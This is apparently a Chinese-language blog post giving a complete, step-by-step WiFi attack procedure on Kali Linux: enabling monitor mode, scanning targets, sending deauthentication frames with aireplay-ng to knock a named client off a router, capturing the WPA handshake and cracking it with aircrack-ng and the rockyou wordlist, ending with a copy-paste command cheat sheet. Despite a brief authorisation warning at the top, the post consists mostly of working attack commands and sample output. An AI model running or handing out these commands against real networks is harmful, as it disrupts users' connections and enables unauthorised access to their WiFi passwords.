---
title: wifi中断攻击
date: 2026-04-28 22:49:49
categories:
  - 网络安全
tags:
  - WiFi
  - Kali
  - 无线安全
sticky: 0
---

# WiFi Deauthentication 攻击完整流程

> **警告：仅限在自己拥有或获得书面授权的网络上进行测试。未经授权攻击他人 WiFi 属于违法行为。**

---

## 环境要求

| 项目 | 要求 |
|---|---|
| 系统 | Kali Linux |
| 网卡 | 外置 USB 无线网卡（支持监听模式） |
| 芯片推荐 | RT3070、AR9271、RTL8812AU |

---

## 一、开启监听模式

```bash
# 1. 查看无线网卡名称
iwconfig

# 2. 关闭可能干扰的进程
airmon-ng check kill

# 3. 开启监听模式（假设网卡为 wlan0）
airmon-ng start wlan0

# 4. 确认监听模式是否开启（网卡名变为 wlan0mon）
iwconfig
```

## 二、扫描目标 WiFi

```bash
# 扫描周围所有 WiFi

airodump-ng wlan0mon

# 扫描结果示例：

BSSID              PWR  Beacons  #Data  CH  ENC   ESSID
AE:12:97:2A:AD:A9  -54  2563     34     6   WPA2  iQ00 12

记录以下信息：


信息	示例值
BSSID（路由器 MAC）	AE:12:97:2A:AD:A9
CH（信道）	6
ESSID（WiFi 名称）	iQ00 12

按 Ctrl + C 停止扫描

```

## 三、锁定目标并抓取握手包

```bash
# 锁定目标信道和 BSSID，开始抓包保存

airodump-ng --channel 6 --bssid AE:12:97:2A:AD:A9 -w capture wlan0mon

参数说明：


参数说明

--channel 6	目标 WiFi 的信道

--bssid AE:12:97:2A:AD:A9	目标路由器的 MAC 地址

-w capture	抓包保存的文件名前缀

此时会显示连接到该 WiFi 的设备：

BSSID              STATION            PWR  Rate  Lost  Frames
AE:12:97:2A:AD:A9  8C:E9:EE:06:72:6E  -58  1e-1e    0     25

记录目标设备的 MAC 地址：8C:E9:EE:06:72:6E
```
## 四、发送 Deauth 攻击触发握手包

打开一个新的终端窗口，执行：

```bash
# 发送断开帧，迫使设备重新连接（触发握手包）

aireplay-ng --deauth 10 -a AE:12:97:2A:AD:A9 -c 8C:E9:EE:06:72:6E wlan0mon

参数说明：

参数
--deauth 10	发送 10 个断开帧（改为 0 则持续发送）

-a AE:12:97:2A:AD:A9	目标路由器的 MAC 地址

-c 8C:E9:EE:06:72:6E	目标设备的 MAC 地址（去掉则踢掉所有设备）
```

## 五、确认抓到握手包

```bush

回到抓包的终端窗口，观察右上角是否出现：

WPA handshake: AE:12:97:2A:AD:A9

出现此提示说明握手包已抓到。 按 Ctrl + C 停止抓包。

如果没有抓到，重复步骤四，多发几次 deauth 帧
```
## 六、解压字典文件

```bash
# 解压 rockyou 字典（如果未解压）

gunzip /usr/share/wordlists/rockyou.txt.gz

```

## 七、字典破解密码

```bash
# 使用 rockyou.txt 字典破解握手包

aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AE:12:97:2A:AD:A9 capture-01.cap

参数说明：

参数
-w /usr/share/wordlists/rockyou.txt	指定字典文件

-b AE:12:97:2A:AD:A9	指定目标路由器 MAC

capture-01.cap	步骤三中保存的抓包文件
```
## 等待破解

## 完整命令速查

    
```bush
# 1. 开启监听                                                          
airmon-ng check kill
airmon-ng start wlan0 

# 2. 扫描目标
airodump-ng wlan0mon

# 3. 锁定目标并抓包
airodump-ng --channel 6 --bssid AE:12:97:2A:AD:A9 -w capture wlan0mon

# 4. 发送断开攻击（新终端）
aireplay-ng --deauth 10 -a AE:12:97:2A:AD:A9 -c 8C:E9:EE:06:72:6E wlan0mon

# 5. 解压字典
gunzip /usr/share/wordlists/rockyou.txt.gz

# 6. 破解密码
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AE:12:97:2A:AD:A9 capture-01.cap

# 7. 恢复网络
airmon-ng stop wlan0mon

systemctl restart NetworkManager
```